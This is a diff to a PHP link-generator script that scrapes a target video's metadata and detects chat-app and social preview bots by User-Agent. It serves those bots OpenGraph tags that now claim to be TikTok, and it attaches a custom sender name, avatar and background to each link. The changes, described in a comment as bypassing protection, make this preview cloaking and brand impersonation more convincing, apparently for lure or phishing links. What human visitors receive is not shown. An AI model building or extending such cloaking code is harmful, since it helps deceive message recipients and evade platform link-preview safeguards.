@@ -40,10 +40,10 @@ try {
     die("Database error: " . $e->getMessage());
 }
 
-// دالة سحب العنوان والصورة المصغرة الحقيقية تلقائياً من أي رابط فيديو
-function fetch_real_meta_auto($url) {
+// دالة متقدمة لسحب البيانات الأصلية وتجاوز الحماية
+function fetch_ultimate_meta($url) {
     $meta = [
-        'title' => 'TikTok - Make Your Day',
+        'title' => 'TikTok · Video',
         'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'
     ];
 
@@ -52,8 +52,8 @@ function fetch_real_meta_auto($url) {
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1');
+    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1');
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
     
@@ -132,17 +132,18 @@ if (isset($_GET['r'])) {
         $meta_image = $link['meta_image'];
         $bg_image_url = !empty($link['bg_image']) ? $link['bg_image'] : $meta_image;
 
-        // التحقق مما إذا كان الطلب قادماً من روبوتات المعاينة (مثل واتساب أو فيسبوك)
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
-        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebookexternalhit|vkShare|twitterbot|linkedinbot|skypeuripreview/i', $ua);
+        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebookexternalhit|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger/i', $ua);
 
-        // إذا كان روبوت معاينة، نعرض له فقط وسوم الـ OpenGraph الأصلية لكي تظهر المعاينة بدقة فوراً
+        // إذا كان الطلب من روبوت تطبيقات الدردشة، نظهر له المعاينة الأصلية بدقة عالية جداً
         if ($is_bot) {
             header('Content-Type: text/html; charset=utf-8');
             echo '<!DOCTYPE html><html><head>';
+            echo '<meta property="og:site_name" content="TikTok">';
+            echo '<meta property="og:type" content="video.other">';
             echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
             echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
-            echo '<meta property="og:type" content="video.other">';
+            echo '<meta property="og:url" content="https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . '">';
             echo '<meta name="twitter:card" content="summary_large_image">';
             echo '<meta name="twitter:title" content="' . htmlspecialchars($meta_title) . '">';
             echo '<meta name="twitter:image" content="' . htmlspecialchars($meta_image) . '">';
@@ -308,7 +309,7 @@ if (isset($_GET['r'])) {
     }
 }
 
-// إنشاء رابط جديد (سحب تلقائي كامل للعنوان والصورة الأصلية بدون إدخال يدوي)
+// إنشاء رابط جديد
 $generated_link = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     $target_url = trim($_POST['target_url']);
@@ -318,12 +319,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
         $target_url = "https://" . $target_url;
     }
 
-    // سحب البيانات تلقائياً من الرابط المستهدف
-    $scraped = fetch_real_meta_auto($target_url);
+    $scraped = fetch_ultimate_meta($target_url);
     $meta_title = $scraped['title'];
     $meta_image = $scraped['image'];
 
-    // رفع صورة الحساب
     $sender_avatar = "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=60";
     if (isset($_FILES['avatar_file']) && $_FILES['avatar_file']['error'] === UPLOAD_ERR_OK) {
         $ext = pathinfo($_FILES['avatar_file']['name'], PATHINFO_EXTENSION);
@@ -334,7 +333,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
         $sender_avatar = trim($_POST['sender_avatar_url']);
     }
 
-    // رفع صورة الخلفية
     $bg_image_url = "";
     if (isset($_FILES['bg_file']) && $_FILES['bg_file']['error'] === UPLOAD_ERR_OK) {
         $ext = pathinfo($_FILES['bg_file']['name'], PATHINFO_EXTENSION);
@@ -428,7 +426,7 @@ if (!empty($filter_code)) {
     <div class="wrapper">
         
         <div class="section-box">
-            <h2>Generate Auto-Scraped Link</h2>
+            <h2>Generate Ultimate Link</h2>
             <form method="POST" enctype="multipart/form-data" class="form-grid">
                 <input type="text" name="target_url" placeholder="Target Video URL (e.g. TikTok / YouTube)..." required>
                 <input type="text" name="sender_name" placeholder="Sender Name (e.g. azez)">
